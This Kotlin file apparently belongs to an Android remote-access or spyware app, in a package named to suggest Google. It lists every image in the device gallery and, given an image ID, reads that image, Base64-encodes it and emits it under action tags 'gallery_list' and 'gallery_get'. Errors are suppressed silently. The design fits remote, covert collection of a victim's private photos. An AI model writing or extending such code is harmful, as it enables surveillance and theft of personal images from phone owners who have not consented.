package com.app.googlemodz

import android.content.Context
import android.provider.MediaStore
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject

object GalleryRechive {
    fun listImages(ctx: Context, emit: (JSONObject) -> Unit) {
        val res = JSONArray()
        val c = ctx.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 
            arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME), 
            null, 
            null, 
            null
        )
        
        c?.use { 
            while (it.moveToNext()) { 
                val o = JSONObject()
                o.put("id", it.getLong(0))
                o.put("name", it.getString(1) ?: "img")
                res.put(o) 
            } 
        }
        
        emit(JSONObject().put("action", "gallery_list").put("data", res))
    }
    
    fun sendImage(ctx: Context, idStr: String, emit: (JSONObject) -> Unit) {
        try {
            val uri = android.content.ContentUris.withAppendedId(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 
                idStr.toLong()
            )
            val i = ctx.contentResolver.openInputStream(uri)
            val b = i?.readBytes()
            i?.close()
            
            emit(JSONObject().put("action", "gallery_get").put("id", idStr).put("data", Base64.encodeToString(b, Base64.NO_WRAP)))
        } catch (e: Exception) {}
    }
}
